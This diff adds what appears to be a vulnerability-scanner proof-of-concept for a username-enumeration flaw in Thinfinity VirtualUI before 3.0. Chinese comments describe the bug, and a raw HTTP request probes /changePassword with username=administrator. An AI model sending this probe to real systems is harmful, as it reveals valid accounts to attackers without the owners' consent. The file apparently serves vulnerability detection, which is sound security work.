@@ -1,0 +1,9 @@
+# Cybele Software Thinfinity VirtualUI授权问题漏洞
+# Cybele Software Thinfinity VirtualUI存在安全漏洞，该漏洞源于在 3.0 版本之前的 Cibele Thinfinity VirtualUI 中，/changePassword 根据用户名是否存在，对无效的认证请求返回不同的响应。
+GET /changePassword?username=administrator&acid=80001630&bid=hd_tag_m8mv258f HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv258f
+RM-PRO-Token: 45321cce43a010448e616846203fc7c1
+RM-PRO-Time: 1742808450941
+User-Agent: curl/7.83.1
+
